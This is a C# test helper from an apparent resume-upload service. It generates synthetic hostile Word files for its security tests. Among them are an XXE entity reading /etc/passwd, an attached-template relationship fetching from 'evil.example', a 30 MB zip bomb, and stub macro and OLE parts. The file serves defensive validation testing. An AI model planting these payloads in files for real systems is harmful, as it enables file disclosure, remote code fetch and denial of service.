using System.IO.Compression;
using System.Text;

namespace Tailorly.Tests.Infrastructure;

/// <summary>Synthetic hostile uploads for the safety tests (SDD §10.5, ApiDesign §12 security tests).</summary>
public static class UnsafeFiles
{
    public static byte[] Pdf() => Encoding.ASCII.GetBytes("%PDF-1.7\n1 0 obj << /Type /Catalog >> endobj\ntrailer\n%%EOF\n");

    /// <summary>A valid .docx with a VBA project part inside (what a .docm carries).</summary>
    public static byte[] WithMacroPart() => Edit(DocxBuilder.SampleResume(), z =>
        Write(z, "word/vbaProject.bin", [0xD0, 0xCF, 0x11, 0xE0, 0x00, 0x01]));

    /// <summary>The main part declared as macro-enabled in [Content_Types].xml.</summary>
    public static byte[] WithMacroContentType() => Edit(DocxBuilder.SampleResume(), z => Replace(z, "[Content_Types].xml",
        "application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml",
        "application/vnd.ms-word.document.macroEnabled.main+xml"));

    public static byte[] WithOleObject() => Edit(DocxBuilder.SampleResume(), z =>
        Write(z, "word/embeddings/oleObject1.bin", [0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1, 0, 0, 0, 0]));

    public static byte[] WithNestedArchive() => Edit(DocxBuilder.SampleResume(), z =>
        Write(z, "word/media/inner.dat", [0x50, 0x4B, 0x03, 0x04, 0x14, 0, 0, 0]));

    /// <summary>A remote attached template (Word would fetch it when the file opens).</summary>
    public static byte[] WithExternalTemplate() => Edit(DocxBuilder.SampleResume(), z =>
        Write(z, "word/_rels/settings.xml.rels", Encoding.UTF8.GetBytes(
            """<?xml version="1.0" encoding="UTF-8" standalone="yes"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="https://evil.example/template.dotm" TargetMode="External"/></Relationships>""")));

    /// <summary>30 MB of zeros: tiny when compressed, over the 25 MB uncompressed limit.</summary>
    public static byte[] ZipBomb() => Edit(DocxBuilder.SampleResume(), z =>
    {
        var e = z.CreateEntry("word/media/padding.bin", CompressionLevel.SmallestSize);
        using var s = e.Open();
        var chunk = new byte[1024 * 1024];
        for (var i = 0; i < 30; i++) s.Write(chunk);
    });

    public static byte[] TooManyEntries() => Edit(DocxBuilder.SampleResume(), z =>
    {
        for (var i = 0; i < 600; i++) Write(z, $"customXml/item{i}.xml", "<a/>"u8.ToArray());
    });

    /// <summary>An XML part with a DOCTYPE and an external entity (XXE).</summary>
    public static byte[] WithDoctype() => Edit(DocxBuilder.SampleResume(), z =>
        Write(z, "customXml/item1.xml", Encoding.UTF8.GetBytes(
            """<?xml version="1.0"?><!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>""")));

    /// <summary>An encrypted Office file: an OLE compound file holding an EncryptedPackage stream.</summary>
    public static byte[] PasswordProtected() => Ole("EncryptedPackage");

    public static byte[] LegacyDoc() => Ole("WordDocument");

    public static byte[] CorruptZip() => [0x50, 0x4B, 0x03, 0x04, 0x01, 0x02, 0x03, 0x04, 0x05];

    private static byte[] Ole(string streamName)
    {
        var ms = new MemoryStream();
        ms.Write([0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1]);
        ms.Write(new byte[504]);
        ms.Write(Encoding.Unicode.GetBytes(streamName));
        ms.Write(new byte[256]);
        return ms.ToArray();
    }

    private static byte[] Edit(byte[] docx, Action<ZipArchive> change)
    {
        var ms = new MemoryStream();
        ms.Write(docx);
        using (var z = new ZipArchive(ms, ZipArchiveMode.Update, leaveOpen: true)) change(z);
        return ms.ToArray();
    }

    private static void Write(ZipArchive z, string name, byte[] data)
    {
        z.GetEntry(name)?.Delete();
        using var s = z.CreateEntry(name).Open();
        s.Write(data);
    }

    private static void Replace(ZipArchive z, string name, string from, string to)
    {
        var entry = z.GetEntry(name)!;
        string text;
        using (var r = new StreamReader(entry.Open())) text = r.ReadToEnd();
        entry.Delete();
        Write(z, name, Encoding.UTF8.GetBytes(text.Replace(from, to, StringComparison.Ordinal)));
    }
}
